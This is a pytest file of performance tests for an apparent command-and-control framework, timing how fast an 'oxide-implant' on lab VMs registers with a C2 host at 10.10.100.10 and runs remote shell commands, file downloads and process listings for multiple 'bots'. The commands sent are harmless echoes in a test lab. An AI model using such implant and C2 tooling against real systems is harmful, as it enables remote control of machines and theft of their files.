"""Performance baseline tests."""

import asyncio
import statistics
import time
import pytest

from .helpers.wait_conditions import wait_for_bot_count, wait_for_response


@pytest.mark.asyncio
async def test_registration_latency(panel_client, target_vm_1, vm_manager):
    """Measure time from implant start to panel registration."""
    # Kill any existing implant
    vm_manager.run_ssh_command(target_vm_1, "pkill -9 oxide-implant", check=False)
    await asyncio.sleep(2)

    # Start timing
    start_time = time.time()

    # Start implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    # Wait for registration
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    registration_time = time.time() - start_time

    assert bots, "Bot did not register"
    assert registration_time < 10, f"Registration took {registration_time:.2f}s (threshold: 10s)"

    # Record for baseline tracking
    print(f"\nPERFORMANCE: registration_latency = {registration_time:.3f}s")


@pytest.mark.asyncio
async def test_command_latency(panel_client, target_vm_1, vm_manager):
    """Measure round-trip time for shell commands."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Measure 10 command round-trips
    latencies = []
    for i in range(10):
        start_time = time.time()
        result = await panel_client.send_command(hwid, "shell", {"command": f"echo {i}"})
        response = await wait_for_response(panel_client, result["command_id"], timeout=30)
        latency = time.time() - start_time

        assert response["status"] == "success"
        latencies.append(latency)

    avg_latency = statistics.mean(latencies)
    p95_latency = sorted(latencies)[int(len(latencies) * 0.95)]
    max_latency = max(latencies)

    assert avg_latency < 1.0, f"Avg latency {avg_latency:.3f}s exceeds 1s threshold"
    assert p95_latency < 2.0, f"P95 latency {p95_latency:.3f}s exceeds 2s threshold"

    print(f"\nPERFORMANCE: command_latency_avg = {avg_latency:.3f}s")
    print(f"PERFORMANCE: command_latency_p95 = {p95_latency:.3f}s")
    print(f"PERFORMANCE: command_latency_max = {max_latency:.3f}s")


@pytest.mark.asyncio
async def test_throughput_commands_per_second(panel_client, target_vm_1, vm_manager):
    """Measure how many commands can be dispatched per second."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Send 50 commands as fast as possible
    num_commands = 50
    start_time = time.time()

    tasks = [
        panel_client.send_command(hwid, "shell", {"command": f"echo {i}"})
        for i in range(num_commands)
    ]
    results = await asyncio.gather(*tasks)

    dispatch_time = time.time() - start_time
    dispatch_rate = num_commands / dispatch_time

    # All should be accepted
    assert all(r.get("command_id") for r in results)

    # Wait for all responses
    response_tasks = [
        wait_for_response(panel_client, r["command_id"], timeout=60)
        for r in results
    ]
    responses = await asyncio.gather(*response_tasks, return_exceptions=True)

    total_time = time.time() - start_time
    completion_rate = num_commands / total_time

    successes = sum(1 for r in responses if isinstance(r, dict) and r.get("status") == "success")
    success_rate = successes / num_commands * 100

    assert success_rate >= 80, f"Success rate {success_rate:.1f}% below 80% threshold"
    assert dispatch_rate >= 10, f"Dispatch rate {dispatch_rate:.1f} cmd/s below 10 cmd/s threshold"

    print(f"\nPERFORMANCE: dispatch_rate = {dispatch_rate:.1f} cmd/s")
    print(f"PERFORMANCE: completion_rate = {completion_rate:.1f} cmd/s")
    print(f"PERFORMANCE: success_rate = {success_rate:.1f}%")


@pytest.mark.asyncio
async def test_file_download_throughput(panel_client, target_vm_1, vm_manager):
    """Measure file download throughput."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Create a test file of known size (1MB)
    vm_manager.run_ssh_command(
        target_vm_1,
        "dd if=/dev/urandom of=/tmp/testfile bs=1M count=1 2>/dev/null",
        check=True,
    )

    # Download and measure
    start_time = time.time()
    result = await panel_client.send_command(hwid, "file_download", {"path": "/tmp/testfile"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=60)
    download_time = time.time() - start_time

    assert response["status"] == "success"

    # Calculate throughput (assuming 1MB file)
    throughput_mbps = 1.0 / download_time

    assert download_time < 30, f"1MB download took {download_time:.2f}s (threshold: 30s)"

    print(f"\nPERFORMANCE: file_download_1mb = {download_time:.3f}s")
    print(f"PERFORMANCE: file_download_throughput = {throughput_mbps:.2f} MB/s")

    # Cleanup
    vm_manager.run_ssh_command(target_vm_1, "rm -f /tmp/testfile", check=False)


@pytest.mark.asyncio
async def test_multi_bot_concurrent_commands(panel_client, target_vms, vm_manager):
    """Measure performance with multiple bots handling commands simultaneously."""
    # Start implants on both targets
    for vm in target_vms:
        vm_manager.run_ssh_command(
            vm,
            "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
            check=False,
        )

    bots = await wait_for_bot_count(panel_client, 2, timeout=90)
    hwids = [b["hwid"] for b in bots]

    # Send 10 commands to each bot simultaneously
    start_time = time.time()

    tasks = []
    for hwid in hwids:
        for i in range(10):
            tasks.append(panel_client.send_command(hwid, "shell", {"command": f"echo {i}"}))

    results = await asyncio.gather(*tasks)
    dispatch_time = time.time() - start_time

    # Wait for all responses
    response_tasks = [
        wait_for_response(panel_client, r["command_id"], timeout=60)
        for r in results
    ]
    responses = await asyncio.gather(*response_tasks, return_exceptions=True)

    total_time = time.time() - start_time

    successes = sum(1 for r in responses if isinstance(r, dict) and r.get("status") == "success")
    success_rate = successes / len(results) * 100

    assert success_rate >= 80, f"Multi-bot success rate {success_rate:.1f}% below threshold"

    print(f"\nPERFORMANCE: multi_bot_dispatch_time = {dispatch_time:.3f}s for {len(results)} commands")
    print(f"PERFORMANCE: multi_bot_total_time = {total_time:.3f}s")
    print(f"PERFORMANCE: multi_bot_success_rate = {success_rate:.1f}%")


@pytest.mark.asyncio
async def test_process_list_performance(panel_client, target_vm_1, vm_manager):
    """Measure process list command performance."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Measure 5 process list calls
    latencies = []
    for _ in range(5):
        start_time = time.time()
        result = await panel_client.send_command(hwid, "process_list", {})
        response = await wait_for_response(panel_client, result["command_id"], timeout=30)
        latency = time.time() - start_time

        assert response["status"] == "success"
        latencies.append(latency)

    avg_latency = statistics.mean(latencies)
    assert avg_latency < 5.0, f"Process list avg latency {avg_latency:.3f}s exceeds 5s threshold"

    print(f"\nPERFORMANCE: process_list_avg = {avg_latency:.3f}s")


@pytest.mark.asyncio
async def test_memory_baseline(panel_client, target_vm_1, vm_manager):
    """Measure implant memory usage."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    await wait_for_bot_count(panel_client, 1, timeout=60)

    # Get memory usage via ps
    result = vm_manager.run_ssh_command(
        target_vm_1,
        "ps -o rss= -p $(pgrep oxide-implant) 2>/dev/null || echo 0",
        check=False,
    )

    memory_kb = int(result.stdout.strip() or 0)
    memory_mb = memory_kb / 1024

    # Implant should use less than 50MB
    assert memory_mb < 50, f"Implant using {memory_mb:.1f}MB (threshold: 50MB)"

    print(f"\nPERFORMANCE: implant_memory_mb = {memory_mb:.2f}")
